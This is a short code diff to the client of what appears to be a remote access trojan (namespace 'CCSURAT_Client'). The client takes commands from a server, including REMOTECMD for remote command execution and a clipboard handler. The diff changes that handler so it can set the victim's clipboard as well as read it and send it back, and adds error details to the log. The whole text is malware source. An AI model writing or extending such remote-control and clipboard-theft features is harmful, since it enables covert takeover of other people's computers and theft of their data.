@@ -60,6 +60,7 @@ namespace CCSURAT_Client
                     Log("Connection successful!");
 
                     Thread cmdListenThread = new Thread(ListenToCommands);
+                    cmdListenThread.SetApartmentState(ApartmentState.STA);
                     cmdListenThread.Start();
 
                     Log("Listening to commands.");
@@ -153,7 +154,10 @@ namespace CCSURAT_Client
                         MessageBox.Show(data);
                         break;
                     case "CLIPBOARD":
-                        Write("[[CLIPBOARD]]" + SystemUtils.GetClipboard() + "[[/CLIPBOARD]]");
+                        if (data == string.Empty)
+                            Write("[[CLIPBOARD]]" + SystemUtils.GetClipboard() + "[[/CLIPBOARD]]");
+                        else
+                            SystemUtils.SetClipboard(data);
                         break;
                     case "REMOTECMD":
                         RemoteCmd(prms[0]);
@@ -162,7 +166,7 @@ namespace CCSURAT_Client
                 }
             } catch(Exception ex)
             {
-                Log("Could not handle data: " + data);
+                Log("Could not handle data: " + data + "\nReason: " + ex.Message);
             }
         }
 
